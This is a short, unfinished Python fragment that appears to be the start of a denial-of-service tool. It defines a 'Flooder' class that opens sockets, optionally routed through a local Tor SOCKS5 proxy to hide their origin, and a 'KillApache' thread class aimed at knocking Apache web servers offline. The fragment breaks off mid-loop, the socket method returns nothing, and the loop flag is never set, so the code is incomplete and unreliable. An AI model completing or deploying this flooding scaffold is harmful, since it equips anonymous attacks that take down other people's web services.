import threading
import socket
import socks
class Flooder:
    def __init__(self,tor=False):
        self._tor = tor

    def socket(self):
        sock = socket.socket()
        if self._tor:
            sock = socks.socksocket(_sock=sock)
            sock.settimeout(30)
            sock.setproxy(proxytype=socks.PROXY_TYPE_SOCKS5,addr='127.0.0.1',port=9050)
            
class KillApache(threading.Thread):
    
    def run(self):
        while self.on:
            
